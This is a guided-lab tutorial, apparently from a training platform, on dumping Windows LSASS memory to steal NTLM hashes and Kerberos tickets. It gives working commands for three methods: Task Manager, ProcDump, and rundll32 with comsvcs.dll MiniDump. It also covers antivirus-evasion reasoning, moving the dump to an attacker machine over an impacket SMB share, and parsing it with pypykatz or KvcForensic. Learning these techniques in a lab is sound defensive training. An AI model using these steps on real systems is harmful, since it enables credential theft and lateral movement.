Attacking LSASS

What LSASS is, why it holds NTLM hashes and Kerberos tickets, and three ways to dump it — GUI via Task Manager, CLI with Microsoft-signed ProcDump, and the LOLBin chain rundll32 + comsvcs.dll MiniDump. Introduction to LSASS

Welcome to this Guided Lab on attacking LSASS! Before we start dumping credentials, we need to understand what we are actually attacking.

Image Credit: semanticscholar.org

What Is LSASS?

In Windows operating systems, LSASS (Local Security Authority Subsystem Service) is a critical process responsible for enforcing security policy. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.

Why Do Attackers Care?

Because LSASS handles logins, it needs to store credentials in its process memory. Historically, it stored passwords in cleartext. While modern Windows versions (Windows 8.1 / Server 2012 R2 and newer) try to prevent cleartext storage by default, LSASS still holds highly valuable data, including NTLM hashes, Kerberos tickets, and sometimes cleartext passwords (if WDigest is enabled or poorly configured).

If an attacker gains local Administrator or SYSTEM privileges, they can read the memory of lsass.exe, dump it to a file, and extract those credentials to move laterally across a network.

In this Guided Lab, you will get hands-on with attacking LSASS from Task Manager, ProcDump, and Native Binaries. Finally, you will learn how to extract the secrets from the LSASS dump.

We strongly encourage you to dump LSASS from EVERY method we show you to build practice.

Attacking LSASS with Task Manager

Let's start with the easiest, most visual method. You don't always need fancy hacker tools to dump memory; Windows provides built-in tools that can do the job perfectly.

If an attacker has RDP (Remote Desktop Protocol) access or GUI access to a compromised machine, they can simply use the built-in Windows Task Manager.

Steps:

  1. Open Task Manager (Run as Administrator).
  2. Click on the Details tab.
  3. Scroll down to find lsass.exe.
  4. Right-click on lsass.exe and select Create memory dump file.

Windows will create a .dmp file (usually in the user's AppData\Local\Temp directory) containing everything LSASS had in memory at that exact second.

Transfering the File:

There are multiple ways to transfer the file. If you do not know how - a big part of hacking is being able to do research. Do a simple Google search on how to transfer files from Windows to Linux, and transfer the dump file to your attack machine.

Attacking LSASS with ProcDump

While Task Manager is easy, attackers usually operate from a command-line interface (CLI). To dump memory via CLI without triggering immediate antivirus alerts, attackers often use ProcDump.

ProcDump is a legitimate Microsoft Sysinternals tool designed for administrators to troubleshoot application crashes. Because it is digitally signed by Microsoft, it is often ignored by basic antivirus solutions.

ProcDump is not installed by default, so you need to install it. The lab machine has internet access, and the .exe can be installed from https://learn.microsoft.com/en-us/sysinternals/downloads/procdump.

The Command:

procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp

  • accepteula: Automatically accepts the Microsoft user agreement (crucial for silent CLI execution).
  • ma: Tells ProcDump to write a "Full" memory dump.
  • lsass.exe: The target process.
  • C:\lsass.dmp: The output file location.
 .\procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp

Attacking LSASS with Native Binaries

Sometimes, bringing a tool like ProcDump onto a target system is too risky. Instead, attackers use LOLBins (Living Off the Land Binaries). These are executables that are already natively installed on Windows.

One famous method uses rundll32.exe to execute a specific function inside comsvcs.dll (a built-in Windows DLL). This function, MiniDumpW, can dump process memory just like Task Manager.

The Command:

First, you need the Process ID (PID) of LSASS. You can find this by running tasklist | findstr lsass. Let's say the PID is 644.

rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 724 C:\lsass2.dmp full

Note: This command requires SeDebugPrivilege, which Administrator accounts have by default.

tasklist | findstr lsass

rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 724 C:\lsass2.dmp full

Extracting Secrets from LSASS with pypykatz

Now that we have our lsass.dmp file (whether from Task Manager, ProcDump, or rundll32), we need to read it. Memory dumps are completely unreadable to the human eye, so we need a parser.

While the original tool for this is Mimikatz (a Windows executable), running Mimikatz on a compromised machine is extremely noisy and almost guaranteed to trigger antivirus. Instead, modern attackers prefer offline parsing. They transfer the .dmp file to their own attacking machine (like Kali Linux) and parse it there.

To do this on Linux, we use Pypykatz, which is a pure Python implementation of Mimikatz.

Steps:

  1. Transfer the File: First, you would transfer lsass.dmp from the Windows target to your Kali machine (using a Python web server, SMB, or SCP).
  2. Run Pypykatz: Open a terminal on your Kali machine and run the following command against the dump file:

pypykatz lsa minidump lsass.dmp

  • lsa: Tells Pypykatz we want to target Local Security Authority secrets.
  • minidump: Specifies that we are feeding it an offline dump file, rather than trying to read live memory.
  • lsass.dmp: The name of the file you transferred.

Once you hit enter, Pypykatz will parse the memory and output the NTLM hashes, cached credentials, and any cleartext passwords it can find!

Transfer Files via imapcket-smbserver

sudo impacket-smbserver -smb2support -username 'Administrator' -password 'ebz0yxy3txh9BDE*yeh' share /home/kali/HackSmarter/LSASS

Open up File Explorer and navigate to your IP address and share folder you created

Once connected you can see connections

Copy and Paste the lsass.dmp file into our share folder

Extracting Secrets from LSASS with KvcForensic

Update from Tyler on 4/6/26

I noticed pypykatz and mimikatz fails against the latest build of Windows Server 2025. If you are targeting Windows Server 2025 and are having issues parsing the dump file, KvcForensic should work.

The author made some design choices different from both Mimikatz and Pypykatz (full details are on the Github page). The two I find most helpful is that it has zero dependencies and you only need to update a .json file to target the latest builds of Windows.

Steps:

  1. Transfer the File: First, you would transfer lsass.dmp from the Windows target to your Kali machine (using a Python web server, SMB, or SCP).
  2. Download the latest Linux release from Github: https://github.com/wesmar/KvcForensic/releases/tag/latest
  3. Unzip the file. You can do this with the following command (when prompted for a password, type github.com):
7z x KvcForensic_Linux.7z
  1. Make the binary executable. You can do this with the following command
chmod +x KvcForensic_static
